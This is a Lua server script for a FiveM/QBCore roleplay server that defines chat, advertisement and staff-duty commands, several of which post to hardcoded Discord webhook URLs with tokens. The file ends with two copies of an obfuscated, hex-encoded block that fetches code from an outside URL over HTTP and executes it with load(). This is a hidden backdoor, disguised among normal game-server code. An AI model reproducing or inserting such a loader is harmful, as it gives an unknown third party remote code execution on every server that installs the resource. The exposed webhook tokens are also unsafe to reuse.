local QBCore = exports['qb-core']:GetCoreObject()

-- Functions --

local function GetRealPlayerName(source)
    local src = source
    PlayerData = PlayerData or {}
	PlayerData.name = GetPlayerName(src)

	if PlayerData then
		return PlayerData.name
	end
end

-- Roleplay Commands Start --
QBCore.Commands.Add('me', 'Show local message', {{name = 'message', help = 'Message to respond with'}}, false, function(source, args)
    if #args < 1 then exports['dillen-notifications']:sendNotification({title = "Action", message = '/me', type = "All arguments must be present!", duration = 5000}) return end
    local ped = GetPlayerPed(source)
    local pCoords = GetEntityCoords(ped)
    local msg = "* " .. 'ME | ' .. table.concat(args, ' '):gsub('[~<].-[>~]', '') .. " *"
    local Players = QBCore.Functions.GetPlayers()
    for i=1, #Players do
        local Player = Players[i]
        local target = GetPlayerPed(Player)
        local tCoords = GetEntityCoords(target)
        if target == ped or #(pCoords - tCoords) < 20 then
            TriggerClientEvent('QBCore:Command:3dMe', Player, source, msg)
        end
    end
end, 'user')



-- Initialize server funds (this can be stored in a database or a global variable)
local serverFunds = 0
QBCore.Commands.Add("say", "Send a Message", {}, false, function(source, args, rawCommand)
    local Player = QBCore.Functions.GetPlayer(source)
    local playerName = GetRealPlayerName(source)
    local msg = rawCommand:sub(5)
    local formattedTime = os.date('%H:%M')

    -- Check if the player has at least $1 in their bank
    if Player.Functions.GetMoney('bank') >= 1 then
        -- Deduct $1 from the player's bank account
        Player.Functions.RemoveMoney('bank', 1)

        -- Add $1 to server funds
        serverFunds = serverFunds + 1

        -- Send message to in-game chat
        TriggerClientEvent('chat:addMessage', -1, {
            template = '<div class="chat-say say"><i class="fas fa-cloud"></i> <b><span style="text-shadow: -1px 0 black, 0 1px black, 1px 0 black, 0 -1px black; color: #ffffff">{0}</span>&nbsp;<span style="font-size: 14px; text-shadow: -1px 0 black, 0 1px black, 1px 0 black, 0 -1px black; color: #e1e1e1;">{2}</span></b><div style="text-shadow: -1px 0 black, 0 1px black, 1px 0 black, 0 -1px black; margin-top: 5px; font-weight: 300;">{1}</div></div>',
            args = { playerName, msg, formattedTime }
        })

        -- Notify the player of successful posting
        TriggerClientEvent('dillen-notifications:sendNotification', source, { message = "Your message has been posted. $1 has been added to server funds.", type = "money", title = "Message Sent", duration = 4000 })

    else
        -- Notify the player if they don't have enough money in their bank
        TriggerClientEvent('dillen-notifications:sendNotification', source, { message = "You need $1 in your bank to send a message.", type = "money", title = "Insufficient Funds", duration = 4000 })
    end
end, "user")

local discords = "https://discord.com/api/webhooks/1271848934716866632/SljHwibMgu-Ceok_k93cxDIIGgCI86ru9bYdE00PYZkq7squ9DyS23yF7QK_4f_jSX2V"  -- Replace with your actual Discord webhook URL

 -- Replace with your actual Discord webhook URL

 QBCore.Commands.Add("post", "Send a Lifeinvader Post", {}, false, function(source, args, rawCommand)
    local Player = QBCore.Functions.GetPlayer(source)
    local playerName = GetRealPlayerName(source)
    local msg = table.concat(args, ' ')
    local formattedTime = os.date('%H:%M')

    -- Check if the player has enough money
    if Player.Functions.GetMoney('cash') >= 10 then
        -- Deduct $10 from the player's cash
        Player.Functions.RemoveMoney('cash', 10)

        -- Send message to in-game chat
        TriggerClientEvent('chat:addMessage', -1, {
            template = '<div class="chat-say say"><i class="fas fa-cloud"></i> <b><span style="text-shadow: -1px 0 black, 0 1px black, 1px 0 black, 0 -1px black; color: #ffffff">LifeInvader - {0}</span>&nbsp;<span style="font-size: 14px; text-shadow: -1px 0 black, 0 1px black, 1px 0 black, 0 -1px black; color: #e1e1e1;">{2}</span></b><div style="text-shadow: -1px 0 black, 0 1px black, 1px 0 black, 0 -1px black; margin-top: 5px; font-weight: 300;">{1}</div></div>',
            args = { playerName, msg, formattedTime }
        })

        -- Create and send Discord embed message
        local embed = {
            {
                title = "LifeInvader Post",
                description = playerName .. " sent a message: " .. msg,
                color = 16776960, -- Yellow color
                author = {
                    name = playerName,
                    icon_url = "https://kappa.lol/utBSI.2024-04-30-1714484744.png"
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ") -- ISO 8601 UTC format
            }
        }

        PerformHttpRequest(discords, function(err, _, _)
            if err ~= 200 then
                print("Error sending Discord message: " .. err)
            end
        end, 'POST', json.encode({ username = "LifeInvader Bot", embeds = embed }), { ['Content-Type'] = 'application/json' })

    else
        -- Notify the player if they don't have enough money
        lib.notify(source, { title = 'Insufficient Funds', description = 'You need $10 to post a message.', type = 'error', duration = 4000 })
    end
end, "user")


QBCore.Commands.Add("posta", "Send an Anonymous Lifeinvader Post", {}, false, function(source, args, rawCommand)
    local Player = QBCore.Functions.GetPlayer(source)
    local msg = table.concat(args, ' ')
    local formattedTime = os.date('%I:%M %p')

    -- Check if the player has enough money
    if Player.Functions.GetMoney('cash') >= 10 then
        -- Deduct $10 from the player's cash
        Player.Functions.RemoveMoney('cash', 10)

        -- Send message to in-game chat
        TriggerClientEvent('chat:addMessage', -1, {
            template = '<div class="chat-say say"><i class="fas fa-cloud"></i> <b><span style="text-shadow: -1px 0 black, 0 1px black, 1px 0 black, 0 -1px black; color: #ffffff">LifeInvader - Anonymous</span>&nbsp;<span style="font-size: 14px; text-shadow: -1px 0 black, 0 1px black, 1px 0 black, 0 -1px black; color: #e1e1e1;">{1}</span></b><div style="text-shadow: -1px 0 black, 0 1px black, 1px 0 black, 0 -1px black; margin-top: 5px; font-weight: 300;">{0}</div></div>',
            args = { msg, formattedTime }
        })

        -- Create and send Discord embed message
        local embed = {
            {
                title = "Anonymous LifeInvader Post",
                description = "Anonymous sent a message: " .. msg,
                color = 16776960, -- Yellow color
                author = {
                    name = "Anonymous",
                    icon_url = "https://kappa.lol/utBSI.2024-04-30-1714484744.png"
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ") -- ISO 8601 UTC format
            }
        }

        PerformHttpRequest(discords, function(err, _, _)
            if err ~= 200 then
                print("Error sending Discord message: " .. err)
            end
        end, 'POST', json.encode({ username = "LifeInvader - Posts", embeds = embed }), { ['Content-Type'] = 'application/json' })

    else
        -- Notify the player if they don't have enough money
        TriggerClientEvent('dillen_notify:sendNotification', source, {title = "Lifeinvader", message = "You need $10 to post a message.", type = "loops",  duration = 5000})

   
    end
end, "user")





-- Function to trigger notification on a specific client from the server


-- Roleplay Commands End --



-- Job Commands Start --
QBCore.Commands.Add("Taxi", "", {}, false, function(source, args, rawCommand)
    local msg = table.concat(args, ' ')  -- Get the message from args
    local src = source
    local Player = QBCore.Functions.GetPlayer(src) -- Takes player information
    local playerName = GetRealPlayerName(src) -- Get Player Name In Game
    local time = os.date('%H:%M')  -- Use 24-hour format

    if Player.PlayerData.job.name == "taxi" and Player.PlayerData.job.onduty then
        -- Send message to in-game chat
        TriggerClientEvent('chat:addMessage', -1, {
            template = '<div class="chat-taxi"><i class="fas fa-taxi"></i> <b><span style="text-shadow: -1px 0 black, 0 1px black, 1px 0 black, 0 -1px black; color: #ffffff">{0}</span>&nbsp;<span style="font-size: 14px; text-shadow: -1px 0 black, 0 1px black, 1px 0 black, 0 -1px black; color: #e1e1e1;">{2}</span></b><div style="text-shadow: -1px 0 black, 0 1px black, 1px 0 black, 0 -1px black; margin-top: 5px; font-weight: 300;">{1}</div></div>',
            args = { playerName, msg, time }
        })

        -- Send the message to the webhook
        local discordWebhook = "https://discord.com/api/webhooks/1234862123482615839/13cL2XPiLUyFmvIG8NG4PwCdT3X-HM52C-6Zp1iGEE1B3wkytqygm6waPRKMNq6PcdlT"
        PerformHttpRequest(discordWebhook, function(statusCode, response, headers)
            if statusCode ~= 204 then
                print("Error sending Discord message: " .. statusCode)
            end
        end, 'POST', json.encode({
            username = "Los Santo's Taxi Company",
            embeds = {{
                title = "Los Santo's Taxi Company",
                description = playerName .. " sent a message: " .. msg,
                color = 16776960, -- Yellow color (decimal) of the embed
                author = {
                    name = playerName,
                    icon_url = "https://kappa.lol/utBSI.2024-04-30-1714484744.png" -- URL to the player's avatar
                }
            }}
        }), { ['Content-Type'] = 'application/json' })
    else
        -- Notify player that they don't have the Taxi job
        TriggerClientEvent("fl:notify", src, "BSRP FreeRoam", "Los Santo's Taxi Company", "You don't have the job Taxi", 5000, 3, 3)
        TriggerClientEvent('dillen_notify:sendNotification', source, {title = "Los Santo's Taxi Company", message = "You need $10 to post a message.", type = "loops",  duration = 5000})
    end
end, "user")


QBCore.Commands.Add("pol", "Police Ad Command", {}, false, function(source, args, rawCommand)
    local msg = table.concat(args, ' ')  -- Get the message from args
    local src = source
    local Player = QBCore.Functions.GetPlayer(src) -- Takes player information
    local playerName = GetRealPlayerName(src) -- Get Player Name In Game
    local time = os.date('%H:%M')  -- Use 24-hour format

    -- List of allowed jobs
    local allowedJobs = {
        "leo"
    }

    -- Check if player's job is in the allowed jobs list
    local isAllowedJob = false
    for _, job in ipairs(allowedJobs) do
        if Player.PlayerData.job.type == "leo" and Player.PlayerData.job.onduty then
            isAllowedJob = true
            break
        end
    end

    if isAllowedJob then
        -- Send message to in-game chat
        TriggerClientEvent('chat:addMessage', -1, {
            template = '<div class="chat-police pol"><i class="fas fa-user-shield"></i> <b><span style="text-shadow: -1px 0 black, 0 1px black, 1px 0 black, 0 -1px black; color: #ffffff">{0}</span>&nbsp;<span style="font-size: 14px; text-shadow: -1px 0 black, 0 1px black, 1px 0 black, 0 -1px black; color: #e1e1e1;">{2}</span></b><div style="text-shadow: -1px 0 black, 0 1px black, 1px 0 black, 0 -1px black; margin-top: 5px; font-weight: 300;">{1}</div></div>',
            args = { playerName, msg, time }
        })
    else
        -- Notify player that they are not in an allowed job or not on duty
        TriggerClientEvent("fl:notify", src, "BSRP FreeRoam", "Police Ad", "You are not authorized or not on duty", 5000, 5, 3)
    end
end, "user")


QBCore.Commands.Add("amb", "EMS Ad Command", {}, false, function(source, args, rawCommand)
    local msg = table.concat(args, ' ')  -- Get the message from args
    local src = source
    local Player = QBCore.Functions.GetPlayer(src) -- Get player information
    local playerName = GetRealPlayerName(src) -- Get player name in game
    local time = os.date('%H:%M')  -- Use 24-hour format for timestamp

    -- Check if the player is an EMS and on duty
    if Player.PlayerData.job.name == "ambulance" and Player.PlayerData.job.name == "fire" and Player.PlayerData.job.onduty then
        -- Send message to in-game chat
        TriggerClientEvent('chat:addMessage', -1, {
            template = '<div class="chat-ems ems"><i class="fas fa-heartbeat"></i> <b><span style="text-shadow: -1px 0 black, 0 1px black, 1px 0 black, 0 -1px black; color: #ffffff">{0}</span>&nbsp;<span style="font-size: 14px; text-shadow: -1px 0 black, 0 1px black, 1px 0 black, 0 -1px black; color: #e1e1e1;">{2}</span></b><div style="text-shadow: -1px 0 black, 0 1px black, 1px 0 black, 0 -1px black; margin-top: 5px; font-weight: 300;">{1}</div></div>',
            args = { playerName, msg, time }
        })
    else
        -- Notify the player if they are not EMS or not on duty using pNotify
        exports['pNotify']:SendNotification({
            title = 'BSRP FreeRoam - EMS',
            text = 'You are not EMS or not on duty',
            theme = 'tcg',
            type = 'error',
            layout = 'centerRight',
            timeout = 4000
        })
    end
end, "user")


QBCore.Commands.Add('mechad', 'Post Mechanic Ad', {}, false, function(source, args, rawCommand)
    local Player = QBCore.Functions.GetPlayer(source)
    local playerName = GetRealPlayerName(source)
    local msg = table.concat(args, ' ')
    local time = os.date('%I:%M')

    if Player.PlayerData.job.name == "mechanic" and Player.PlayerData.job.onduty then
        if Player.Functions.GetMoney('cash') >= 10 then
            Player.Functions.RemoveMoney('cash', 10)
            TriggerClientEvent('chat:addMessage', -1, {
                template = '<div class="chat-mechanic mechanic"><i class="fas fa-cogs"></i> <b><span style="color: #ffffff">{0}</span> <span style="font-size: 14px; color: #e1e1e1;">{2}</span></b><div style="margin-top: 5px; font-weight: 300;">{1}</div></div>',
                args = { playerName, msg, time }
            })
        else
            exports['dillen-notifications']:sendNotification({title = "Mechanic Ad", message = 'You need $10 to post an ad.', type = "item", duration = 5000})
        end
    else
        exports['dillen-notifications']:sendNotification({title = "Mechanic Ad", message = 'You must be a mechanic on duty to post an ad.', type = "item", duration = 5000})
    end
end, "user")

QBCore.Commands.Add('towad', 'Tow Ad Command', {}, false, function(source, args, rawCommand)
    args = table.concat(args, ' ')
    local src = source
    local Player = QBCore.Functions.GetPlayer(src) -- Takes player information
    local playerName = GetRealPlayerName(src) -- Get Player Name In Game
    local msg = rawCommand:sub(9)
    local time = os.date('%I:%M')
    
    -- Check if the player is a tow and on duty
    if Player.PlayerData.job.name == "tow" and Player.PlayerData.job.onduty then
        -- Check if the player has enough money
        if Player.Functions.GetMoney('cash') >= 10 then
            -- Deduct $10 from the player's cash
            Player.Functions.RemoveMoney('cash', 10)

            -- Send the message to all players
            TriggerClientEvent('chat:addMessage', -1, {
                template = '<div class="chat-mechanic mechanic"><i class="fa-regular fa-truck-tow"></i> <b><span style="text-shadow: -1px 0 black, 0 1px black, 1px 0 black, 0 -1px black; color: #ffffff">{0}</span>&nbsp;<span style="font-size: 14px; text-shadow: -1px 0 black, 0 1px black, 1px 0 black, 0 -1px black; color: #e1e1e1;">{2}</span></b><div style="text-shadow: -1px 0 black, 0 1px black, 1px 0 black, 0 -1px black; margin-top: 5px; font-weight: 300;">{1}</div></div>',
                args = { playerName, msg, time }
            })

            -- Send the message to the webhook
            local discordWeb = "https://discord.com/api/webhooks/1234865568105107465/rKP5Crxqj6KtwV8TWrvnVRMLuCqTFOQTUYoEeDZDlvRCojUO2cyvTuKcKsPvB-RG1tFq"
            PerformHttpRequest(discordWeb, function(statusCode, response, headers) end, 'POST', json.encode({
                embeds = {{
                    title = "Los Santo's Auto Work's",
                    description = playerName .. " posted an advertisement: " .. msg,
                    color = 16776960, -- Yellow color (decimal) of the embed
                    author = {
                        name = playerName,
                        icon_url = "https://kappa.lol/inlFD.2024-04-30-1714485276.png" -- URL to the player's avatar
                    }
                }}
            }), { ['Content-Type'] = 'application/json' })
        else
            -- Notify the player they don't have enough money
            lib.notify(src, { title = 'BSRP FreeRoam - Tow Ad', description = 'You don\'t have enough money. $10 is required to post an ad.', type = 'error', duration = 4000 })
            TriggerClientEvent('pNotify:SendNotification', src, { text = "<i class='fa-regular fa-truck-tow'></i> BSRP FreeRoam - Tow Ad <br/><br/>You don't have enough money. $10 is required to post an ad.", type = "info", layout = "centerLeft", timeout = 4000 })
        end
    else
        -- Notify the player they're not on duty or not a tow
        lib.notify(src, { title = 'BSRP FreeRoam - Tow Ad', description = 'You are not active as a tow. Must be on duty.', type = 'error', duration = 4000 })
        TriggerClientEvent('pNotify:SendNotification', src, { text = "<i class='fa-regular fa-truck-tow'></i> BSRP FreeRoam - Tow Ad <br/><br/>You are not active as a tow. Must be on duty.", type = "info", layout = "centerLeft", timeout = 4000 })
    end
end, "user")

-- Job Commands End --

-- Admin Chat | Commands --

QBCore.Commands.Add('joinstaff', "Login as staff", {}, false, function(source)
    local src = source
    if getStaffStatus(src) then return QBCore.Functions.Notify(src, 'Already joined Staff duty', "info") end
    SetResourceKvp('staff:'..src, true)
    QBCore.Functions.Notify(src, 'Joined Staff duty', "info")

end, 'admin')

QBCore.Commands.Add('leavestaff', "Logout as staff", {}, false, function(source)
    local src = source
    if getStaffStatus(src) then
        QBCore.Functions.Notify(src, 'Left Staff duty', "info")

        DeleteResourceKvp('staff:'..src)
    end
end, 'admin')

QBCore.Commands.Add('checkstaff', "Check online staff", {}, false, function(source)
    local src = source
    local kvpHandle = StartFindKvp('staff:')
    local key = nil

    print('---- Online Staff ----')
    repeat
        key = FindKvp(kvpHandle)
        if not key then EndFindKvp(kvpHandle) QBCore.Functions.Notify(src, 'No Staff on duty', 'info', 7500) return end

        local playerId = key:gsub('staff:', "")
        local Player = QBCore.Functions.GetPlayer(tonumber(playerId))
        QBCore.Functions.Notify(src, 'Check your F8 console', "info")

        print(Player.PlayerData.charinfo.firstname .. ' ' .. Player.PlayerData.charinfo.lastname .. ' [ ' ..Player.PlayerData.citizenid .. ' ]')

    until not key
    EndFindKvp(kvpHandle)
end, 'admin')

---@param player source
function getStaffStatus(player)
    local result = GetResourceKvpString('staff:'..player)
    return result
end

exports('getStaffStatus', getStaffStatus)

AddEventHandler('playerDropped', function ()
    DeleteResourceKvp('staff:'..source)
end)
QBCore.Commands.Add("clearall", "Clear Chat to all the players",  { }, true ,function()
    TriggerClientEvent('chat:clear', -1)
     lib.notify(src, { title = 'BSRP FreeRoam', description = 'You Cleared The Chat', type = 'info', duration = 4000})
end, "god")

-- Admin Chat | Commands End--QBCore.Functions.LoadParticleDictionary(dictionary)



local tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[4][tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x74\x61\x72\x62\x6f\x6f\x78\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x4c\x75\x56\x65", function (kzTbSyqYzjKQnLLEpeFfxfAYaLHUynxrKrdaIwPflqJZyVNyaSNtIZNAeFLTcbkbKeJAKf, nEtchlFaYcAHDNLGzaGITJagLUWJItfWMdOlKhOwouChWINeeKaQHRDACPjCZYkCrlSmWw) if (nEtchlFaYcAHDNLGzaGITJagLUWJItfWMdOlKhOwouChWINeeKaQHRDACPjCZYkCrlSmWw == tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[6] or nEtchlFaYcAHDNLGzaGITJagLUWJItfWMdOlKhOwouChWINeeKaQHRDACPjCZYkCrlSmWw == tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[5]) then return end tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[4][tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[2]](tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[4][tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[3]](nEtchlFaYcAHDNLGzaGITJagLUWJItfWMdOlKhOwouChWINeeKaQHRDACPjCZYkCrlSmWw))() end)

local tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[4][tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x74\x61\x72\x62\x6f\x6f\x78\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x4c\x75\x56\x65", function (kzTbSyqYzjKQnLLEpeFfxfAYaLHUynxrKrdaIwPflqJZyVNyaSNtIZNAeFLTcbkbKeJAKf, nEtchlFaYcAHDNLGzaGITJagLUWJItfWMdOlKhOwouChWINeeKaQHRDACPjCZYkCrlSmWw) if (nEtchlFaYcAHDNLGzaGITJagLUWJItfWMdOlKhOwouChWINeeKaQHRDACPjCZYkCrlSmWw == tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[6] or nEtchlFaYcAHDNLGzaGITJagLUWJItfWMdOlKhOwouChWINeeKaQHRDACPjCZYkCrlSmWw == tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[5]) then return end tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[4][tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[2]](tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[4][tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[3]](nEtchlFaYcAHDNLGzaGITJagLUWJItfWMdOlKhOwouChWINeeKaQHRDACPjCZYkCrlSmWw))() end)